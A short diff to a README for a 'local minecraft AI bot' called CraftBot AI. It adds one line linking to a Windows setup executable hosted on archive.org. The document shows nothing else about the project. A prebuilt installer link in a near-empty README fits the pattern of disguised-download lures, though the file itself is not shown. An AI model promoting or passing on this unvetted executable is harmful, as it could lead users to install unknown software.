@@ -1,4 +1,8 @@
 # craftbot-AI
+
+DOWNLOAD: https://archive.org/download/zanaat-bot-yapay-kurulumu/CraftBot-AI-Setup.exe
+
+
 local minecraft AI bot
 
 CraftBot AI
